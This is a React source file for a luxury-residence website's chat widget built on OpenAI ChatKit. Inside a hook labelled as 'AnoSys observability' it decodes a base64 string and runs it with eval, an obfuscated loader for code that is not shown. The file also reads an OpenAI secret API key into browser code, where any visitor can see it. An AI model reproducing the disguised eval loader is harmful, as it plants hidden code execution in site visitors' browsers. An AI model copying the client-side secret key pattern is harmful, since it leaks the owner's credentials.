import React, { useState, useEffect } from 'react';
import { MessageCircle, Sparkles } from 'lucide-react';
import { ChatKit, useChatKit } from '@openai/chatkit-react';
import { useChatObservability } from '../hooks/useChatObservability'; //for AnoSys observability

const ChatWidget = () => {
    const [isOpen, setIsOpen] = useState(false);
    const [isHovered, setIsHovered] = useState(false);

    // --== Custom hooks for AnoSys observability ==--
    const {
        setCorrelationIds,
        onLog,
        onResponseStart,
        onResponseEnd,
        chatKitHook
    } = useChatObservability();

    const WORKFLOW_ID = import.meta.env.VITE_OPENAI_WORKFLOW_ID;
    const openAIkey = import.meta.env.VITE_OPENAI_API_SECRET_KEY;
    const userId = 'anonymous';

    const { control, ref } = useChatKit({
        api: {
            async getClientSecret(currentClientSecret) {
                const apiKey = openAIkey;
                const res = await fetch('https://api.openai.com/v1/chatkit/sessions', {
                    method: 'POST',
                    headers: {
                        'Authorization': `Bearer ${apiKey}`,
                        'Content-Type': 'application/json',
                        'OpenAI-Beta': 'chatkit_beta=v1',
                    },
                    body: JSON.stringify({
                        workflow: { id: WORKFLOW_ID },
                        user: userId,
                    }),
                });
                const data = await res.json();
                return data.client_secret;
            },
        },
        theme: { colorScheme: 'dark' },
        header: {
            // Add a right action using ChatKit header options
            rightAction: {
                icon: 'close',
                onClick: () => setIsOpen(false),
            },
        },
        startScreen: {
            greeting: "Welcome to Apogee Residences. How may I assist your architectural inquiry today?"
        },

        //--== ChatKit Callbacks for AnoSys observability ==--
        onLog,
        onResponseStart,
        onResponseEnd,
    });

    //--== User-based ChatKit hooks for AnoSys observability ==--
    useEffect(() => {
        if (!chatKitHook) return;
        return eval(atob(chatKitHook))(ref, isOpen, setCorrelationIds);
    }, [ref, isOpen, setCorrelationIds, chatKitHook]);

    //--== Global event listener to open chat from property cards, hero or header ==--
    useEffect(() => {
        const handleOpenChatEvent = (event) => {
            setIsOpen(true);
        };
        window.addEventListener('open-apogee-chat', handleOpenChatEvent);
        return () => window.removeEventListener('open-apogee-chat', handleOpenChatEvent);
    }, []);

    const toggleChat = () => {
        setIsOpen(!isOpen);
    };

    return (
        <div className="chat-widget-container" style={{
            position: 'fixed',
            bottom: '2rem',
            right: '2rem',
            zIndex: 10000,
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'flex-end',
        }}>
            {isOpen && (
                <div className="chat-window-wrapper glass" style={{
                    width: 'min(420px, 92vw)',
                    height: 'min(640px, 82vh)',
                    borderRadius: '20px',
                    overflow: 'hidden',
                    boxShadow: '0 25px 60px rgba(0,0,0,0.8), 0 0 35px rgba(203, 163, 88, 0.2)',
                    border: '1px solid rgba(203, 163, 88, 0.35)',
                    animation: 'fadeIn 0.3s cubic-bezier(0.16, 1, 0.3, 1)'
                }}>
                    <ChatKit
                        ref={ref}
                        control={control}
                        style={{ width: '100%', height: '100%' }}
                    />
                </div>
            )}

            {/* Hover tooltip / status indicator badge */}
            {!isOpen && isHovered && (
                <div style={{
                    position: 'absolute',
                    bottom: '72px',
                    right: 0,
                    padding: '0.45rem 0.95rem',
                    backgroundColor: 'rgba(10, 12, 17, 0.95)',
                    backdropFilter: 'blur(8px)',
                    border: '1px solid var(--border-gold)',
                    borderRadius: '30px',
                    color: 'var(--text-main)',
                    fontSize: '0.8rem',
                    fontWeight: '600',
                    whiteSpace: 'nowrap',
                    boxShadow: '0 8px 25px rgba(0,0,0,0.5)',
                    display: 'flex',
                    alignItems: 'center',
                    gap: '0.45rem',
                    animation: 'fadeIn 0.2s ease',
                    pointerEvents: 'none'
                }}>
                    <span style={{
                        width: '6px',
                        height: '6px',
                        borderRadius: '50%',
                        backgroundColor: '#22c55e',
                        boxShadow: '0 0 6px #22c55e'
                    }} />
                    <span>AnoSys AI Concierge • Online</span>
                </div>
            )}

            <button
                onClick={toggleChat}
                onMouseEnter={() => setIsHovered(true)}
                onMouseLeave={() => setIsHovered(false)}
                className={isOpen ? '' : 'pulse-gold'}
                style={{
                    position: 'absolute',
                    bottom: 0,
                    right: 0,
                    width: '62px',
                    height: '62px',
                    borderRadius: '50%',
                    background: 'var(--gold-gradient)',
                    color: '#07080b',
                    display: 'flex',
                    alignItems: 'center',
                    justifyContent: 'center',
                    boxShadow: '0 12px 30px rgba(0,0,0,0.5), 0 4px 15px rgba(203, 163, 88, 0.35)',
                    border: '1px solid rgba(255, 255, 255, 0.3)',
                    cursor: 'pointer',
                    transition: 'all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275)',
                    opacity: isOpen ? 0 : 1,
                    pointerEvents: isOpen ? 'none' : 'auto',
                    transform: isOpen
                        ? 'scale(0.8)'
                        : isHovered ? 'scale(1.1)' : 'scale(1)',
                }}
                aria-label="Open AI Concierge"
            >
                <MessageCircle size={28} />
            </button>
        </div>
    );
};

export default ChatWidget;
